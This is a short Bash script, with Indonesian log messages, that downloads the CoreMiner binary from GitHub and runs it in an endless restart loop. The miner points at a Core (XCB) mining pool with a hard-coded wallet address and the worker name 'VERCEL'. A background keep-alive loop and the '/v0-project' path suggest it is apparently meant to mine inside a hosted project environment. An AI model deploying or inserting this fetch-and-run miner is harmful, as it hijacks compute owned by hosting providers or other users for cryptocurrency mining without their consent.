#!/usr/bin/env bash
set -Eeuo pipefail

WORKDIR="/v0-project/.xcb-work"

keep_alive() {
    while sleep 60; do
        echo "[keep-alive] $(date '+%Y-%m-%d %H:%M:%S') - proses masih aktif"
    done
}

keep_alive &
KEEP_PID=$!

cleanup() {
    kill "$KEEP_PID" 2>/dev/null || true
}
trap cleanup EXIT INT TERM

mkdir -p "$WORKDIR"
cd "$WORKDIR"

rm -rf xcbminer xcb.tar.gz
mkdir -p xcbminer

echo "Mengunduh CoreMiner..."

curl -fL \
  "https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz" \
  -o xcb.tar.gz

echo "Mengekstrak..."

tar xzf xcb.tar.gz -C xcbminer

BIN="$(find "$WORKDIR/xcbminer" -type f -name coreminer | head -n 1)"

if [[ -z "$BIN" ]]; then
    echo "ERROR: binary coreminer tidak ditemukan"
    exit 1
fi

chmod +x "$BIN"

echo "CoreMiner ditemukan: $BIN"

while true; do
    "$BIN" \
      --noeval \
      --hard-aes \
      -P "stratum1+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.VERCEL@us.catchthatrabbit.com:8008" \
      -t 4

    EXIT_CODE=$?
    echo "[$(date)] CoreMiner berhenti: exit=$EXIT_CODE. Restart 2 detik..."
    sleep 2
done
